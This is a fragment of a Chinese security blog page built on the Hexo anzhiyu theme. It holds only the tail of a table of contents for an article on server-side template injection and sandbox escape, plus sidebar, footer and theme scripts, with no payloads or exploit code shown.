class="toc-number">1.3.7.5.</span> <span class="toc-text">过滤了中括号</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#28-%E8%84%9A%E6%9C%AC"><span class="toc-number">1.3.8.</span> <span class="toc-text">2.8 脚本</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%AF%BB%E6%89%BE%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0-eval-%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">1.3.8.1.</span> <span class="toc-text">1. 寻找内建函数 eval 执行命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%AF%BB%E6%89%BE-os-%E6%A8%A1%E5%9D%97%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">1.3.8.2.</span> <span class="toc-text">2. 寻找 os 模块执行命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%AF%BB%E6%89%BE-popen-%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">1.3.8.3.</span> <span class="toc-text">3. 寻找 popen 函数执行命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E5%AF%BB%E6%89%BE-importlib-%E7%B1%BB%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">1.3.8.4.</span> <span class="toc-text">4. 寻找 importlib 类执行命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E5%AF%BB%E6%89%BE-linecache-%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">1.3.8.5.</span> <span class="toc-text">5. 寻找 linecache 函数执行命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-%E5%AF%BB%E6%89%BE-subprocesspopen-%E7%B1%BB%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">1.3.8.6.</span> <span class="toc-text">6. 寻找 subprocess.Popen 类执行命令</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8"><span class="toc-number">1.4.</span> <span class="toc-text">四、沙箱逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#41-%E5%8E%9F%E7%90%86"><span class="toc-number">1.4.1.</span> <span class="toc-text">4.1 原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#42-%E5%87%BD%E6%95%B0%E5%AF%BC%E5%85%A5%E9%99%90%E5%88%B6%E5%92%8C%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.2.</span> <span class="toc-text">4.2 函数导入限制和绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-import"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">1. import</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-builtins"><span class="toc-number">1.4.2.2.</span> <span class="toc-text">2. builtins</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0"><span class="toc-number">1.4.2.3.</span> <span class="toc-text">3. 魔法函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E7%B1%BB%E7%BB%A7%E6%89%BF%E4%BD%BF%E7%94%A8"><span class="toc-number">1.4.2.4.</span> <span class="toc-text">4. 类继承使用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E7%89%B9%E6%AE%8A%E5%87%BD%E6%95%B0%E6%9F%A5%E6%89%BE"><span class="toc-number">1.4.2.5.</span> <span class="toc-text">5. 特殊函数查找</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#51-python3"><span class="toc-number">1.4.2.5.1.</span> <span class="toc-text">5.1 python3</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#52-python2"><span class="toc-number">1.4.2.5.2.</span> <span class="toc-text">5.2 python2</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94-php-smarty%E6%A8%A1%E6%9D%BF"><span class="toc-number">1.5.</span> <span class="toc-text">五、PHP-smarty模板</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-smarty-ssti%E5%B8%B8%E8%A7%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">1.5.1.</span> <span class="toc-text">1. Smarty-SSTI常规利用方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-ctf%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-number">1.5.2.</span> <span class="toc-text">2. CTF漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-php%E7%9A%84%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5"><span class="toc-number">1.5.3.</span> <span class="toc-text">3. PHP的模板注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD-php-blade%E6%A8%A1%E6%9D%BF"><span class="toc-number">1.6.</span> <span class="toc-text">六、PHP-Blade模板</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%83-php-twig%E5%BC%95%E6%93%8E"><span class="toc-number">1.7.</span> <span class="toc-text">七、PHP-Twig引擎</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AB-python-tornado%E6%A8%A1%E6%9D%BF"><span class="toc-number">1.8.</span> <span class="toc-text">八、Python-tornado模板</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B9%9D-python-django%E6%A8%A1%E6%9D%BF"><span class="toc-number">1.9.</span> <span class="toc-text">九、Python-Django模板</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81-java-velocity%E6%A8%A1%E6%9D%BF"><span class="toc-number">1.10.</span> <span class="toc-text">十、Java-velocity模板</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95"><span class="toc-number">1.10.1.</span> <span class="toc-text">1. 基本语法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E4%B8%80-java-freemarker"><span class="toc-number">1.11.</span> <span class="toc-text">十一、Java-FreeMarker</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E4%BA%8C-%E8%87%AA%E5%8A%A8%E5%8C%96%E5%B7%A5%E5%85%B7"><span class="toc-number">1.12.</span> <span class="toc-text">十二、自动化工具</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%81%E4%B8%89-%E6%BC%8F%E6%B4%9E%E9%98%B2%E5%BE%A1"><span class="toc-number">1.13.</span> <span class="toc-text">十三、漏洞防御</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-sha-he-gui-bi/" title="THM-沙盒规避">THM-沙盒规避</a><time datetime="2024-08-21T09:41:49.000Z" title="发表于 2024-08-21 17:41:49">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-fang-huo-qiang/" title="THM-防火墙">THM-防火墙</a><time datetime="2024-08-21T07:07:33.000Z" title="发表于 2024-08-21 15:07:33">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-wang-luo-an-quan-jie-jue-fang-an/" title="THM-网络安全解决方案">THM-网络安全解决方案</a><time datetime="2024-08-21T01:37:19.000Z" title="发表于 2024-08-21 09:37:19">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/20/thm-kao-tu-di-wei-sheng/" title="THM-靠土地为生">THM-靠土地为生</a><time datetime="2024-08-20T10:08:09.000Z" title="发表于 2024-08-20 18:08:09">2024-08-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/20/thm-tao-bi-ri-zhi-ji-lu-he-jian-kong/" title="THM-逃避日志记录和监控">THM-逃避日志记录和监控</a><time datetime="2024-08-20T06:51:56.000Z" title="发表于 2024-08-20 14:51:56">2024-08-20</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2024 By <a class="footer-bar-link" href="/" title="hybcx" target="_blank">hybcx</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">204</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">23</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">30</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 0.88rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 0.88rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 0.88rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 0.88rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 0.88rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 0.88rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 0.88rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 0.88rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 0.88rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 0.88rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 0.88rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 0.88rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="is-center" id="loading-database"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-pulse-icon"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2020 By 安知鱼 V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 hybcx 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>(() => {
  const initValine = () => {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
      appKey: 'iEFJUGMm2FY91n9ZG1gdKBSy',
      avatar: 'mp',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  const loadValine = async () => {
    if (typeof Valine === 'function') initValine()
    else {
      await getScript('https://cdn.cbd.int/valine@1.5.1/dist/Valine.min.js')
      initValine()
    }
  }

  if ('Valine' === 'Valine' || !false) {
    if (false) anzhiyu.loadComment(document.getElementById('vcomment'),loadValine)
    else setTimeout(loadValine, 0)
  } else {
    window.loadOtherComment = loadValine
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script src="https://cdn.cbd.int/blueimp-md5@2.19.0/js/md5.min.js"></script><script>window.addEventListener('load', () => {
  const changeContent = (content) => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const getIcon = (icon, mail) => {
    if (icon) return icon
    let defaultIcon = '?d=mp'
    let iconUrl = `https://gravatar.loli.net/avatar/${md5(mail.toLowerCase()) + defaultIcon}`
    return iconUrl
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
        }

        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div></div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom && ($dom.innerHTML= result)
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const getComment = () => {
    const serverURL = 'https://7Sc5uZwc.api.lncldglobal.com'

    var settings = {
      "method": "GET",
      "headers": {
        "X-LC-Id": '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
        "X-LC-Key": 'iEFJUGMm2FY91n9ZG1gdKBSy',
        "Content-Type": "application/json"
      },
    }

    fetch(`${serverURL}/1.1/classes/Comment?limit=6&order=-createdAt`,settings)
      .then(response => response.json())
      .then(data => {
        const valineArray = data.results.map(function (e) {
          return {
            'avatar': getIcon(e.QQAvatar, e.mail),
            'content': changeContent(e.comment),
            'nick': e.nick,
            'url': e.url + '#' + e.objectId,
            'date': e.updatedAt,
          }
        })
        saveToLocal.set('valine-newest-comments', JSON.stringify(valineArray), 10/(60*24))
        generateHtml(valineArray)
      }).catch(e => {
        const $dom = document.querySelector('#card-newest-comments .aside-list')
        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
      }) 
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('valine-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script async data-pjax src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.1/bubble/bubble.js"></script><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><script src="/js/anzhiyu/right_click_menu.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

